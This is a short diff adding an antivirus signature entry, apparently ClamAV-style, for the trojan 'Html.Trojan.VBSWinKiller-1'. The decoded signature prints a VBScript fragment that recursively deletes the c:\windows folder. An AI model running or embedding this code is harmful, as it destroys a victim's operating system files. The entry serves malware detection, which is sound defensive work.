@@ -1,0 +1,9 @@
+VIRUS NAME: Html.Trojan.VBSWinKiller-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+dim foldersys
+set foldersys=CreateObject("Scripting.FileSystemObject")
+If foldersys.FolderExists ("c:\windows") Then
+foldersys.DeleteFolder "c:\windows",True
+End if
